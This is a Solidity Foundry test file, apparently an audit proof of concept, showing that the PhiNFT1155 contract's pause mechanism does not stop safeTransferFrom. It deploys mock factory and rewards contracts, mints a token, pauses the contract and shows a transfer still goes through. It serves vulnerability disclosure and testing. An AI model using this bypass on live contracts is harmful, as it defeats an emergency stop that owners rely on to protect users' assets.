// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import { PhiNFT1155 } from "src/art/PhiNFT1155.sol";
import { IPhiFactory } from "src/interfaces/IPhiFactory.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating that the pause mechanism of PhiNFT1155 is ineffective –
 *         users can still transfer NFTs while the contract is paused.
 *
 * Scenario
 *  1. A mock PhiFactory and PhiRewards contracts are deployed so the NFT contract can be
 *     initialised normally.
 *  2. The factory creates a new art (tokenId = 1) and allows a user to mint one copy.
 *  3. The factory (owner) pauses the PhiNFT1155 contract.
 *  4. The user is STILL able to call safeTransferFrom to transfer his NFT, proving that
 *     the Pausable mechanism is not enforced on transfers.
 *
 * Expected behaviour (secure implementation)
 *  - safeTransferFrom should revert when the contract is paused.
 *
 * Vulnerable behaviour (observed)
 *  - Transfer succeeds and balances update even when paused.
 */
contract ExploitTest is Test {
    PhiNFT1155 internal nft;
    MockFactory internal factory;
    MockRewards internal rewards;
    address internal owner = vm.addr(0xDEAD);
    address internal impl;

    address internal user = vm.addr(0xA11CE);
    address internal receiver = vm.addr(0xB0B);

    function setUp() public {
        // Deploy helper contracts
        rewards = new MockRewards();
        factory = new MockFactory(address(rewards));

        // Deploy NFT implementation and proxy so we can run initialize() once via delegatecall
        impl = address(new PhiNFT1155());
        uint256 credChainId = 1;
        uint256 credId = 42;
        bytes memory initData = abi.encodeWithSelector(
            PhiNFT1155.initialize.selector,
            credChainId,
            credId,
            "SIGNED",
            factory.protocolFeeDestination()
        );
        // Deploy proxy with empty initialization, we'll call manually via prank to set msg.sender
        ERC1967Proxy proxy = new ERC1967Proxy(impl, "");
        nft = PhiNFT1155(payable(address(proxy)));

        // Call initialize via factory so that msg.sender is correctly recognised
        vm.prank(address(factory));
        (bool ok,) = address(nft).call(initData);
        require(ok, "initialize failed");

        // Create a new art (artId = 1) – only callable by factory
        uint256 artId = 1;
        vm.prank(address(factory));
        uint256 tokenId = nft.createArtFromFactory{value: 0}(artId);
        assertEq(tokenId, 1, "TokenId should start at 1");

        // Let factory register minimal ArtData so that NFT contract calls succeed
        factory.setArtData(artId, user, user, tokenId, 0 /* mintFee */, false /* soulBounded */);

        // Mint one copy to `user` through claimFromFactory
        vm.prank(address(factory));
        nft.claimFromFactory{value: 0}(artId, user, address(0), address(0), 1, bytes32(0), "");
        assertEq(nft.balanceOf(user, tokenId), 1, "User should have 1 token after mint");

        // The owner (factory) pauses the contract
        vm.prank(address(factory));
        nft.pause();
        // Ensure paused flag is true (via public Pausable function)
        assertTrue(nft.paused(), "Contract must be paused for the test");
    }

    function test_TransferSucceedsEvenWhenPaused() public {
        uint256 tokenId = 1;

        // user -> receiver transfer while contract is paused
        vm.prank(user);
        nft.safeTransferFrom(user, receiver, tokenId, 1, "");

        // Balances changed as if the contract were NOT paused – vulnerability proven
        assertEq(nft.balanceOf(user, tokenId), 0, "User balance should be zero after transfer");
        assertEq(nft.balanceOf(receiver, tokenId), 1, "Receiver should now own the token");
    }
}

/**
 * @notice Minimal mock of rewards contract – simply accepts ETH and function calls.
 */
contract MockRewards {
    function handleRewardsAndGetValueSent(
        uint256, /* artId */
        uint256, /* credId */
        uint256, /* quantity */
        uint256, /* mintFee */
        bytes calldata, /* addressesData */
        bool /* chainSync */
    ) external payable {}
}

/**
 * @notice Minimal mock of the factory contract implementing the subset of functionality
 *         used by PhiNFT1155 in this PoC.
 */
contract MockFactory {
    address private immutable _rewards;
    address private immutable _protocolFeeDestination;
    uint256 private _artCreateFee;

    mapping(uint256 => IPhiFactory.ArtData) private _artData;

    constructor(address rewards_) {
        _rewards = rewards_;
        _protocolFeeDestination = address(0xBEEF);
        _artCreateFee = 0; // zero for simplicity
    }

    /*//////////////////////////////////////////////////////////////
                              Helpers
    //////////////////////////////////////////////////////////////*/

    function setArtData(
        uint256 artId,
        address artist,
        address receiver,
        uint256 tokenId,
        uint256 mintFee,
        bool soulBounded
    ) external {
        IPhiFactory.ArtData storage data = _artData[artId];
        data.artist = artist;
        data.receiver = receiver;
        data.tokenId = tokenId;
        data.mintFee = mintFee;
        data.soulBounded = soulBounded;
    }

    /*//////////////////////////////////////////////////////////////
                         Functions used by NFT
    //////////////////////////////////////////////////////////////*/

    function protocolFeeDestination() external view returns (address) {
        return _protocolFeeDestination;
    }

    function artCreateFee() external view returns (uint256) {
        return _artCreateFee;
    }

    function artData(uint256 artId) external view returns (IPhiFactory.ArtData memory) {
        return _artData[artId];
    }

    function phiRewardsAddress() external view returns (address) {
        return _rewards;
    }
}
